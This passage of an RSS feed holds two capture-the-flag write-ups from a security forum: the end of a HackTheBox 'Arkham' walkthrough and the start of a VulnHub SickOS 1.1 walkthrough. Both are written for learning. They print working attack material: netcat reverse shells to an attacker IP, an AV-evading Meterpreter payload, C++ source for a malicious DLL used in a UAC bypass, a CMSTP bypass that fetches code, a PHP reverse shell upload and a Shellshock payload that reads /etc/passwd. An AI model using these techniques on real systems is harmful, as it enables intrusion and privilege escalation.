After unzipping the file it turns out the content is a .ost file, so an Outlook mail archive, so to say. On Linux we can open it using readpst and it will extract the emails it finds:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/ea8d42602ed5a619c1de9d990939af119cd62b46.png" alt="image" data-base62-sha1="xsWnekMqKfJoZZ2LcjbASBLE1b8" width="615" height="391"><br>
The only email it found was in the Drafts folder and we can read it by catting the Drafts file created by readpst. The mail contains an image as attachment which is encoded in Base64 and the body of the message tells us this email was supposed to be sent to Master Wayne because he keeps forgetting his password:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/39d765447b9141596614b49516b6ba0e49285db6.png" alt="image" data-base62-sha1="8fGHjPZjSG60pZRYxR2TtQlFF7o" width="690" height="312"><br>
Convert the attachment back to .png and the result is this:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e09c74002b4943b302daf945645e4a649fb4fb1d.png" alt="image" data-base62-sha1="w309sPgVlWE88C5R0GAXrZWOmJL" width="656" height="330"><br>
Not only this picture gives us the Batman account’s password, it also gives us a big hint on one of the two ways we have to get root. So now we have a new pair of credentials:</p>
<pre><code>User: batman
Pass: Zx^#QZX+T!123
</code></pre>
<p>There are no services such as RDP or SSH running on the box so we cannot log in as Batman from the outside, but we can do it through a <a href="https://www.sconstantinou.com/windows-powershell-sessions-pssessions/" rel="noopener nofollow ugc">PSSession</a>:</p>
<pre><code class="lang-auto">$pw = ConvertTo-SecureString -string "Zx^#QZX+T!123" -AsPlainText -force;
$pp = new-object -typename System.Management.Automation.PSCredential -ArgumentList "ARKHAM\batman", $pw;
Enter-PSSession -ComputerName localhost -Credential $pp
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f10d7d2f4f7c874e4bf0b17667a4fb69fbfadf47.png" alt="image" data-base62-sha1="yorYalDBP4o67N3ReAKx6ChS0M7" width="690" height="188"><br>
Once in the PSSession we must follow the following syntax in order to run cmd commands:</p>
<pre><code>Invoke-Command -ScriptBlock { command }
</code></pre>
<p>This is very tedious to write every time so we can bypass this obstacle by using the nc.exe executable we uploaded earlier to start a normal cmd shell on another port:</p>
<pre><code>Invoke-Command -ScriptBlock {C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.14.29 9797 -e cmd.exe}
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9bcddc8b4845beb0626a3218dffbfc8da49455ce.png" alt="image" data-base62-sha1="mej3YAHktXIVii1IjzCRLYyDBYa" width="588" height="199"><br>
Now we can start investigating the system further. Batman’s home folder doesn’t contain anything so what’s the purpose in using this account? Well, apparently Batman is actually part of the Administrators group:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5470d5ad5382536a306a4c223e0bc4a34b5ca773.png" alt="image" data-base62-sha1="c2ZQZs136Qj0on0itWrcoqrQgdZ" width="690" height="284"><br>
But trying to access the Administrator folder still results in an access denied error:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/74b2b79aae28b4bd6bef47639578572680467e5b.png" alt="image" data-base62-sha1="gEmhKYSMACdoKoF3cmgMKmubvn5" width="414" height="88"><br>
This is because UAC is enabled and doesn’t allow us to use Administrator privileges, we’d need to be in an interactive desktop and click “Yes” on the UAC prompt in order to execute commands that require Administrator permissions.</p>
<hr>
<p><strong>Getting root - the easy way (net use)</strong></p>
<p>I said that the attachment picture is a clear hint of a way to grab the root flag because we can use the same utility shown in Alfred’s screenshot to access it. Because we are already administrators with this account we can use net use and mount the administrator’s folder (or the whole drive) on to another drive and we’ll be able to access it without UAC getting in the way:</p>
<pre><code>$ net use * "\\arkham\users\administrator\desktop" /persistent:no
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6ad0d25d386b088ebe3c5a0936e1b0f8e32dfaf2.png" alt="image" data-base62-sha1="feW0DRLVvZJv6Ad0zkcIdhomNCa" width="690" height="274"></p>
<hr>
<p><strong>Getting root - the real men’s way (UAC bypass)</strong></p>
<p>There are a few currently unpathced UAC bypasses for Windows 10, I tried these two:</p>
<ol>
<li><a href="https://egre55.github.io/system-properties-uac-bypass/" rel="noopener nofollow ugc">https://egre55.github.io/system-properties-uac-bypass/</a></li>
<li><a href="https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html" rel="noopener nofollow ugc">https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html</a></li>
</ol>
<p>And I’m going to demonstrate egre55’s method because in my opinion it’s more fun, even if a little longer. This method abuses the fact that some executables can bypass the UAC prompt thanks to a property found inside the executable’s manifest: “<em>autoElevate</em>”. If set to “true” this allows certain programs to be granted a token of higher integrity without going through the UAC prompt, while other processes stay with a medium integrity security token preventing them from performing any operations where administrator privileges are required. Egre55 found that some of the programs with this property are vulnerable to DLL hijacking and crafting a malicious DLL allows us to execute arbitrary code bypassing UAC. These are the vulnerable programs:</p>
<pre><code>C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
C:\Windows\SysWOW64\SystemPropertiesComputerName.exe
C:\Windows\SysWOW64\SystemPropertiesHardware.exe
C:\Windows\SysWOW64\SystemPropertiesProtection.exe
C:\Windows\SysWOW64\SystemPropertiesRemote.exe
</code></pre>
<p>They all try to load a library called srrstr.dll from AppData/Local/Microsoft/WindowsApps/, folder which is present in the PATH environment variable and can be written to by normal users:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/21961a02cf14b385f842fd62db461c520d07d5a1.png" alt="image" data-base62-sha1="4N7lyG4aZD175rKEH69peYT6RgJ" width="690" height="76"><br>
If we drop a malicious srrstr.dll file in that folder and start one of those programs our code will be executed with elevated privileges. Before we do that we must make sure our shell is in an interactive process, otherwise it won’t work. To do this we need a Meterpreter shell but because Defender will find and delete all default Meterpreter payloads there’s also a bit of AV evasion involved that I’ll solve with <a href="https://github.com/GreatSCT/GreatSCT" rel="noopener nofollow ugc">GreatSCT</a>. To be more specific I’ll be launching Meterpreter via the msbuild method, read more about it <a href="https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/" rel="noopener nofollow ugc">here</a>. Other useful AV evasion solutions that could work in this instance are <a href="https://github.com/Veil-Framework/Veil" rel="noopener nofollow ugc">Veil</a>, <a href="https://github.com/oddcod3/Phantom-Evasion" rel="noopener nofollow ugc">Phantom Evasion</a>, <a href="https://github.com/Genetic-Malware/Ebowla" rel="noopener nofollow ugc">Ebowla</a> and <a href="https://github.com/trustedsec/nps_payload" rel="noopener nofollow ugc">nps_payload</a>.</p>
<p>These are the steps to generate the payload using GreatSCT:</p>
<pre><code>&gt; use Bypass
&gt; use msbuild/meterpreter/rev_tcp.py
&gt; set LHOST 10.10.14.29
&gt; set LPORT 9292
&gt; generate
</code></pre>
<p>GreatSCT will create two different files for us:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1bc1b1e582d78f5da816f4b3640b35270787915b.png" alt="image" data-base62-sha1="3XxSD3MatZyKMC4vIVtVR1Igr8v" width="582" height="206"><br>
payload.xml will be msbuild’s input, while payload.rc is a Metasploit resource file to be opened by msfconsole either with the -r flag or the resource command, and will start a multi handler for us. So let’s download the xml file on Arkham (again with Invoke-WebRequest or “iwk” for short) and then launch msbuild.exe by specifing its absolute path since it’s not in %path%:</p>
<pre><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe msbuild.xml
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8019f8ebe63b2880742dad295ea6fd88f937b03c.png" alt="image" data-base62-sha1="iheLe38FCYJdFpZo6lUsw18prOs" width="690" height="122"><br>
The handler in the meantime catches the incoming connection and starts a Meterpreter session:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e4302307efa79b83a2c63e7bd0b8775e7888f7b1.png" alt="image" data-base62-sha1="wyDZKuBU7Q1z1LKWE0FioBLxxol" width="690" height="285"><br>
Now we can list running processes with ps and select an interactive one (so one with a GUI) to migrate to, explorer.exe is a good example:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/20c649103ba7a8f549080375dcaa04638b40541f.png" alt="image" data-base62-sha1="4FW6q8mgfDW8d8Zif2YOUFIWuIL" width="690" height="120"><br>
Now it’s time to craft a DLL. Mine will just start a reverse shell with the same nc.exe we’ve been using over and over again, here’s the C++ code:</p>
<pre><code class="lang-auto">#include &lt;windows.h&gt;

void exploit(void);

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
            exploit();
    }
    return TRUE;
}

void exploit(void)
{
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    ZeroMemory(&amp;si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&amp;pi, sizeof(pi));
    char cmd[] = "C:\\tomcat\\apache-tomcat-8.5.37\\bin\\nc.exe -e cmd 10.10.14.29 5555";
    
    CreateProcess(NULL, // No module name (use command line)
        cmd,            // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory
        &amp;si,            // Pointer to STARTUPINFO structure
        &amp;pi );          // Pointer to PROCESS_INFORMATION structure

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    ExitThread(0);
}
</code></pre>
<p>If you’re interested in knowing more about how it works I suggest reading these two pages: <a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain" rel="noopener nofollow ugc">DllMain</a>, <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa" rel="noopener nofollow ugc">CreateProcessA</a>. I compiled it using mingw32:</p>
<pre><code>┌─[baud@parrot]─[~/arkham]
└──╼ $i686-w64-mingw32-gcc -shared -o srrstr.dll srrstr.cpp -l ws2_32
</code></pre>
<p>Note: if anyone knows why only the code compiled with i686-w64-mingw32-gcc works on the box and not with x86_64-w64-mingw32-gcc please let me know, because I’m a little confused.  Anyway, drop the DLL in the WindowsApps folder, launch one of the vulnerable programs, and a shell is spawned:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/347c9c4d2a7e9ec4bfc1a6ad65bfea72262d525e.png" alt="image" data-base62-sha1="7ujNVJeWDclbKkmCeFqWHlzEIUe" width="690" height="215"><br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4354d6d08a34686b54777aae82f8dcb187666877.png" alt="image" data-base62-sha1="9BDKXOnnfgs9FSM8oLUAVJ2VwFh" width="550" height="264"><br>
Note that the full path of the program must be specified, this is necessary because there are two different copies of the program on the disk, one in System32 and the other in SysWOW64, apparently the attack only works with the second executable.</p>
<p>The second UAC bypass is easy to pull off as well, it consinsts in downloading a <a href="https://github.com/0xVIC/UAC/blob/master/SendKeys_technique.cs" rel="noopener nofollow ugc">C# source file</a>, compiling it as a DLL on Arkham, loading the DLL into memory from PS, and calling the bypass function from the DLL by giving it a command to run which will inherit higher privileges. <a href="https://oddvar.moe/2017/08/15/research-on-cmstp-exe/" rel="noopener nofollow ugc">Here</a> is explained the bypass that the DLL exploits, which relies on a binary called CMSTP.exe:</p>
<pre><code class="lang-auto"># download the file locally:
Invoke-WebRequest "http://10.10.14.29:9090/bypass.cs" -outfile "./Source.cs"
# compile it as a DLL:
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "CMSTP-UAC-Bypass.dll"
# load the newly compiled DLL into memory:
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))
# get a reverse shell using nc:
[CMSTPBypass]::Execute("C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.14.29 9898 -e cmd.exe")
</code></pre>
<p><a href="https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html" rel="noopener nofollow ugc">(source)</a></p>
<p>This was Arkham, one of the most fun and instructive boxes I’ve done so far. Thank you for reading, I hope you found this post useful.</p>
            <p><small>4 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/hackthebox-writeup-arkham/15541">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/hackthebox-writeup-arkham/15541</link>
          <pubDate>Sat, 10 Aug 2019 15:08:51 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-15541</guid>
          <source url="https://0x00sec.org/t/hackthebox-writeup-arkham/15541.rss">HackTheBox Writeup: Arkham</source>
        </item>
        <item>
          <title>[VulnHub] SickOS 1.1 Writeup</title>
          <dc:creator><![CDATA[petruknisme]]></dc:creator>
          <category>CTF</category>
          <description><![CDATA[
            <p>SickOS are Vulnerable VM hosted by <a href="https://vulnhub.com" rel="noopener nofollow ugc">VulnHub</a> that I tried after kioptrix from <a href="https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms" rel="noopener nofollow ugc">Abatchy</a> suggestion for OSCP like vms.</p>
<h4>Disclaimer</h4>
<p>This guide is for educational purpose only and someone looking for OSCP preparation like I am. In this series, I will be guiding you how to root the VM without using Metasploit.</p>
<p>VM Description:</p>
<pre><code class="lang-auto">Name........: SickOs1.1
Date Release: 11 Dec 2015
Author......: D4rk
Series......: SickOs
Objective...: Get /root/a0216ea4d51874464078c618298b1367.txt
Tester(s)...: h1tch1
Twitter.....: https://twitter.com/D4rk36
</code></pre>
<p>Download link: <a href="https://www.vulnhub.com/entry/sickos-11,132/" rel="noopener nofollow ugc">SickOS 1.1</a></p>
<p><strong>Vulnerability Summary</strong></p>
<ul>
<li>Squid Proxy misconfiguration</li>
<li>Shellshock bug</li>
<li>Wolf CMS 0.8.2 admin weak password</li>
<li>Sensitivie information disclosure</li>
<li>Local priv escape by misconfigured sudo list</li>
</ul>
<h4>Host Discovery</h4>
<p>Because all VulnHub VM comes with random DHCP IP address for the machines, we need to identify the IP address from the VM first. In this section, we can use several methods for discovering the host.</p>
<p>I’m using VMware for hosting the machines, but I don’t know why VMware is not showing as Vendor name in arp-scan, netdiscover or nmap. It only shows as Unknown or Intel corporate. Because of only 3 machines connected to wifi, it’s easy to determine which one is the VM.</p>
<p>Okay, try to discover the host using 3 methods with root privilege.</p>
<p><strong>Arp-Scan</strong></p>
<pre><code class="lang-auto">↳ arp-scan -l
Interface: wlp2s0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
192.168.43.1    xx:xx:xx:xx:xx:xx       (Unknown) &lt;--- Routers
192.168.43.202  xx:xx:xx:xx:xx:xx       (Unknown) &lt;--- VulnHub VM, MAC address is same as host
</code></pre>
<p><strong>Netdiscover</strong></p>
<pre><code class="lang-auto">↳ netdiscover -r 192.168.43.0/24
 Currently scanning: Finished!   |   Our Mac is: xx:xx:xx:xx:xx:xx - 0        
 3 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 126                               
 _____________________________________________________________________________
   IP            At MAC Address      Count  Len   MAC Vendor                   
 ----------------------------------------------------------------------------- 
 192.168.43.1    xx:xx:xx:xx:xx:xx    01    042   Unknown vendor        
</code></pre>
<p><strong>Nmap</strong></p>
<pre><code class="lang-auto">↳ nmap -sn 192.168.43.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-23 20:35 WIB
Nmap scan report for 192.168.43.1
Host is up (0.0045s latency).
MAC Address: xx:xx:xx:xx:xx:xx (Asustek Computer)
Nmap scan report for 192.168.43.202
Host is up (0.00023s latency).
MAC Address: xx:xx:xx:xx:xx:xx (Intel Corporate) &lt;--- This is our target
Nmap scan report for 192.168.43.229
Host is up (0.14s latency).
MAC Address: xx:xx:xx:xx:xx:xx (Apple)
Nmap scan report for 192.168.43.94
Host is up.
Nmap scan report for 192.168.43.95
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 9.05 seconds
</code></pre>
<p>Nah, we have our target IP 192.168.43.202(censored MAC address). As always, we can use nmap to scan and enum open port for the machine.</p>
<p><strong>Port scanning and enumeration</strong></p>
<pre><code class="lang-auto">↳ nmap -p- -T5 -A -sT -Pn 192.168.43.202   
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-23 20:39 WIB
Nmap scan report for 192.168.43.202
Host is up (0.00052s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported: GET HEAD
|_http-server-header: squid/3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy
MAC Address: xx:xx:xx:xx:xx:xx (Intel Corporate)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>From the above results, we know that nmap tell us port 22 and 3128 is open. While port 8080 state is closed, it’s so weird if open port just ssh and squid proxy. What’s interesting is port 3128 for Squid Proxy. After hours of searching, I get this explanation from rapid7 and from other write-up for SickOS. As <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/squid_pivot_scanning" rel="noopener nofollow ugc">rapid7</a> explanation:</p>
<blockquote>
<p>A misconfigured Squid proxy can allow an attacker to make requests on his behalf. This may give the attacker information about devices that he cannot reach but the Squid proxy can. For example, an attacker can make requests for internal IP addresses against a misconfigured open Squid proxy exposed to the Internet, therefore performing an internal port scan. The error messages returned by the proxy are used to determine if the port is open or not. Many Squid proxies use custom error codes so your mileage may vary. The open_proxy module can be used to test for open proxies, though a Squid proxy does not have to be open in order to allow for pivoting (e.g. an Intranet Squid proxy which allows the attack to pivot to another part of the network).</p>
</blockquote>
<p>I don’t want to use metasploit built-in <code>auxiliary/scanner/http/squid_pivot_scanning</code> for this. So I’m building my own tools(after understanding the attack flow) for checking open port behind misconfigured squid proxy. You can use my tool for this purpose, just clone and run it:</p>
<p>Spose - Squid Pivoting Open Port Scanner : <a href="http://github.com/aancw/spose" rel="noopener nofollow ugc">http://github.com/aancw/spose</a></p>
<p><strong>Scan with proxy</strong></p>
<pre><code class="lang-auto">↳ python spose.py --proxy http://192.168.43.202:3128 --target 192.168.43.202
Using proxy address http://192.168.43.202:3128
192.168.43.202 22 seems OPEN 
192.168.43.202 80 seems OPEN 
</code></pre>
<p>Gotcha! from spose we know that port 80 is open behind squid proxy.</p>
<p><strong>cURL</strong></p>
<pre><code class="lang-auto">↳ curl -kv -x http://192.168.43.202:3128 http://192.168.43.202
*   Trying 192.168.43.202...
* TCP_NODELAY set
* Connected to 192.168.43.202 (192.168.43.202) port 3128 (#0)
&gt; GET http://192.168.43.202/ HTTP/1.1
&gt; Host: 192.168.43.202
&gt; User-Agent: curl/7.62.0
&gt; Accept: */*
&gt; Proxy-Connection: Keep-Alive
&gt; 
* HTTP 1.0, assume close after body
&lt; HTTP/1.0 200 OK
&lt; Date: Sun, 23 Dec 2018 15:59:53 GMT
&lt; Server: Apache/2.2.22 (Ubuntu)
&lt; X-Powered-By: PHP/5.3.10-1ubuntu3.21
&lt; Vary: Accept-Encoding
&lt; Content-Length: 21
&lt; Content-Type: text/html
&lt; X-Cache: MISS from localhost
&lt; X-Cache-Lookup: MISS from localhost:3128
&lt; Via: 1.0 localhost (squid/3.1.19)
* HTTP/1.0 connection set to keep alive!
&lt; Connection: keep-alive
&lt; 
&lt;h1&gt;
BLEHHH!!!
&lt;/h1&gt;
* Connection #0 to host 192.168.43.202 left intact
</code></pre>
<p>Hm something weird with only “BLEHH” output. Trying to scan with nikto then.</p>
<p><strong>Nikto</strong></p>
<pre><code class="lang-auto">↳ nikto -h 192.168.43.202 -useproxy http://192.168.43.202:3128
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.43.202
+ Target Hostname:    192.168.43.202
+ Target Port:        80
+ Proxy:              192.168.43.202:3128
+ Start Time:         2018-12-23 23:02:04 (GMT7)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Retrieved via header: 1.0 localhost (squid/3.1.19)
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-cache-lookup' found, with contents: MISS from localhost:3128
+ Uncommon header 'x-cache' found, with contents: MISS from localhost
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server leaks inodes via ETags, header found with file /robots.txt, inode: 265381, size: 45, mtime: Sat Dec  5 07:35:02 2015
+ Server banner has changed from 'Apache/2.2.22 (Ubuntu)' to 'squid/3.1.19' which may suggest a WAF, load balancer or proxy is in place
+ Uncommon header 'x-squid-error' found, with contents: ERR_INVALID_REQ 0
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+ Uncommon header 'nikto-added-cve-2014-6271' found, with contents: true
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8347 requests: 0 error(s) and 21 item(s) reported on remote host
+ End Time:           2018-12-23 23:02:17 (GMT7) (13 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
</code></pre>
<p>From nikto result, the web server is vulnerable to shellsock vulnerability. Good news for us!</p>
<p><strong>dirb</strong></p>
<p>Using dirb for simple directory searching and found this endpoints.</p>
<pre><code class="lang-auto">↳ dirb http://192.168.43.202 -p 192.168.43.202:3128

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Dec 23 23:03:37 2018
URL_BASE: http://192.168.43.202/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
PROXY: 192.168.43.202:3128

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.43.202/ ----
+ http://192.168.43.202/cgi-bin/ (CODE:403|SIZE:290)                            
+ http://192.168.43.202/connect (CODE:200|SIZE:109)                               
+ http://192.168.43.202/index (CODE:200|SIZE:21)                                  
+ http://192.168.43.202/index.php (CODE:200|SIZE:21)                                           
+ http://192.168.43.202/robots (CODE:200|SIZE:45)                                               
+ http://192.168.43.202/robots.txt (CODE:200|SIZE:45)                                           
+ http://192.168.43.202/server-status (CODE:403|SIZE:295)                                                                                                           
-----------------
END_TIME: Sun Dec 23 23:03:40 2018
DOWNLOADED: 4612 - FOUND: 7
</code></pre>
<p>Checking for robots.txt and it telling us that the web server is hosted wolfcms.</p>
<pre><code class="lang-auto">User-agent: *
Disallow: /
Dissalow: /wolfcms
</code></pre>
<p>From the informations we get before, we can summarize the vulnerability by 2 attack vector.</p>
<ul>
<li>Exploiting Machine with Shellsock</li>
<li>Finding Wolfcms Vuln</li>
</ul>
<p>As far I know, the above attack vector is resulting reverse shell for connection when success. So we can listen for incoming reverse shell connection with netcat:</p>
<pre><code class="lang-auto">↳ nc -lvp 4443
Listening on [0.0.0.0] (family 0, port 4443)
</code></pre>
<p><strong>WolfCMS Attack Vector</strong></p>
<p>Using wolfcms as attack vector for getting root shell with wolfcms 0.8.2 vulnerability. I’ve found that in this version is affected by Arbitrary File Upload vuln as mentioned in <a href="https://www.exploit-db.com/exploits/36818" rel="noopener nofollow ugc">Exploit-DB</a>. But, we need a valid credential/session for uploading reverse shell or backdoor for login credential. Trying to use a common weak password like admin:admin, admin:password and other for the login at <a href="http://192.168.43.202/wolfcms/?/admin/login" rel="noopener nofollow ugc">http://192.168.43.202/wolfcms/?/admin/login</a><br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/1/18c327055e9654fe140676e828cb826f4490878c.png" alt="wolfcms-login" data-base62-sha1="3x3zqAPZLXWlvTgb67Ai5ugPVjC" width="690" height="209"></p>
<p>Input admin:admin for the credential and then it redirected us to administration dashboard. Good news!</p>
<p>So, what’s next?</p>
<p>After logging in to administrator dashboard, we can upload PHP reverse shell in file manager feature.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/6/69134f125374cd8a6909bd2708a98598f05ace3a.png" alt="wolfcms-upload-file" data-base62-sha1="eZxvdkq8sKGGEYz7O9GNm6Aq1ey" width="689" height="338"></p>
<p>Nah, we can upload the file in <code>public/images</code> directory or in <code>public</code> directory. For simple php reverse shell, you can download from <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" rel="noopener nofollow ugc">PentestMonkey.net</a> and change the file with IP and port for the reverse shell as I mentioned above.</p>
<pre><code class="lang-auto">$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
</code></pre>
<p>Upload the file, access it(<a href="http://192.168.43.202/wolfcms/public/reverse.php" rel="noopener nofollow ugc">http://192.168.43.202/wolfcms/public/reverse.php</a>) and see an incoming connection in netcat listening session:</p>
<pre><code class="lang-auto">↳ nc -lvp 4443
Listening on [0.0.0.0] (family 0, port 4443)
Connection from 192.168.43.202 56724 received!
Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 15:38:55 up 24 min,  0 users,  load average: 0.00, 0.01, 0.03
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
</code></pre>
<p>Gotcha! We have a reverse shell from our backdoor. Next, exploiting shellsock vulnerability.</p>
<p><strong>Shellsock Attack Vector</strong></p>
<p>We will use this attack vector for rooting the machine. If you are don’t know about shellsock, you can read the explanation from <a href="https://coderwall.com/p/5db5eg/understanding-the-shellshock-vulnerability" rel="noopener nofollow ugc">coderwall</a></p>
<blockquote>
<p>The <strong>Shellshock</strong> vulnerability, also know as <strong>CVE-2014-6271</strong> , allows attackers to inject their own code into <a href="http://www.gnu.org/software/bash/" rel="noopener nofollow ugc">Bash</a> using specially crafted <strong>environment variables</strong></p>
</blockquote>
<p>From nikto scan result, we know that affected endpoint is <code>cgi-bin/status</code> . So, we need to test this by sending a malicious crafted request with wget, curl or other tools. For simple Proof, we are sending a request to the affected endpoint with <code>cat /etc/passwd</code> for showing <code>/etc/passwd</code> content.</p>
<pre><code class="lang-auto">↳ wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -e use_proxy=yes -e http_proxy=192.168.43.202:3128 http://192.168.43.202/cgi-bin/status

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
landscape:x:104:109::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
